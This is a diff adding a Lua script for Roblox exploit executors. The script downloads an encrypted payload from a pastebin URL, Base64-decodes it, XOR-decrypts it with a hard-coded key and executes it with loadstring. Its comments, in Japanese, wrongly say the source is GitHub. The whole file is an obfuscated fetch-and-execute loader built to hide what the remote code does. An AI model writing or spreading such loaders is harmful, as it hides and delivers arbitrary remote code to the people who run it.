@@ -1,0 +1,42 @@
+local http = game:GetService("HttpService")
+
+-- 🔽 GitHub から暗号化されたスクリプトを取得
+local encodedScript = game:HttpGet("https://pastebin.com/raw/KV8ui2bs", true)
+
+-- 🔄 Base64 をデコード
+local decodedScript
+if syn and syn.crypt and syn.crypt.base64.decode then
+    decodedScript = syn.crypt.base64.decode(encodedScript)
+elseif crypt and crypt.base64decode then
+    decodedScript = crypt.base64decode(encodedScript)
+elseif http and http.base64decode then
+    decodedScript = http.base64decode(encodedScript)
+else
+    error("❌ Base64 デコードがサポートされていません！")
+end
+
+-- 🔑 XOR 復号キー（エンコード時と同じキー）
+local key = "Test12345"
+
+-- 🔄 XOR で復号
+local function xor_decrypt(data, key)
+    local result = {}
+    local keyLength = #key
+    for i = 1, #data do
+        local keyByte = key:byte((i - 1) % keyLength + 1)
+        local dataByte = data:byte(i)
+        table.insert(result, string.char(bit.bxor(dataByte, keyByte)))
+    end
+    return table.concat(result)
+end
+
+-- 🔓 XOR 復号
+local finalScript = xor_decrypt(decodedScript, key)
+
+-- 🚀 実行
+if finalScript and #finalScript > 0 then
+    local success, err = pcall(loadstring(finalScript))
+    if not success then print("❌ スクリプト実行エラー:", err) end
+else
+    print("❌ 復号スクリプトが空またはエラー")
+end
